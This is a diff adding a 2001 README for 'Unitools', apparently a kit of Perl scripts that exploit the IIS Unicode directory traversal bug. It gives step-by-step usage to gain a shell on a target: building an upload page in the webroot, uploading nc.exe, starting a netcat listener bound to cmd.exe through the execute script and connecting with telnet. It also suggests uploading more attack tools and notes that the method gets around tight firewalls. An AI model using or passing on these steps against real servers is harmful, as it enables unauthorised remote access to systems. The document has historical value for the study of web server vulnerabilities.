@@ -1,0 +1,81 @@
+
+Unitools - for working with IIS servers with the Unicode bug
+------------------------------------------------------------
+2001/01/24 Roelof Temmingh 
+roelof@sensepost.com
+http://www.sensepost.com
+---------------------------
+
+Tarbal contains :
+
+0. This REAME
+1. Unicode upload creator (unicodeloader.pl)
+2. Unicode execute version 3 (unicodexecute3.pl)
+3. upload.asp (used with 1)
+4. upload.inc (used with 1)
+
+1. Unicode upload creator (unicodeloader.pl)
+
+ Works like this - two files (upload.asp and upload.inc - have
+ it in the same dir as the PERL script) are build in the webroot
+ (or anywhere else) using echo and some conversion strings.
+ These files allows you to upload any file by
+ simply surfing with a browser to the server.
+
+ Typical use: (5 easy steps to a shell)
+ 1. Find the webroot (duh)- let say its f:\the web pages\theroot
+ 2. perl unicodeloader target:80 'f:\the web pages\theroot'
+ 3. surf to target/upload.asp and upload nc.exe
+ 4. perl unicodexecute3.pl target:80 'f:\the web pages\theroot\nc -l -p 80 -e cmd.exe'
+ 5. telnet target 80
+
+ Above procedure will drop you into a shell on the box
+ without crashing the server (*winks at Eeye*).
+ 
+ Of coure you might want to upload other goodies as well
+ right after nc.exe - fscan.exe seems a good choice :)
+ 
+ This procedure is nice for servers that are very tightly
+ firewalled; servers that are not allowed to FTP, RCP or TFTP
+ to the Internet.
+
+ Note: kids, please have a *good* look at the code before you use it :-]
+ More info on Unicode at 
+ 
+ http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
+
+
+
+2. Unicodexecute version3 (unicodexecute3.pl)
+
+ -includes searches for alternative executable dirs
+ -more robust, stable than before
+ -checks for access denied added
+ -thnx to MH for testing etc.
+ 
+ Usage is same as previous version:
+ unicodexecute3.pl target:port 'command'
+
+ Note: kids - please have a *good* look at the code before you use it :-]
+ More info at 
+ 
+ http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
+
+
+
+PS1: (loader)
+-------------
+I am sure the code can be *seriously* optimized. Go for it!!
+MH says: "Shouldn't the execute directory also be a) writable b) published ?"
+Good point..hmmm...seriously optimized...see what I mean? Then you dont
+even have to spec the webroot. Anyone for some PERL?
+
+PS2: (execute)
+--------------
+When working with unicodexecute3.pl and long directory names, you
+should use "s -e.g : 
+
+perl unicodexecute3.pl target:80 'copy "g:\blah blah webs\pages\nc.exe" c:\nc.exe'
+
+
+
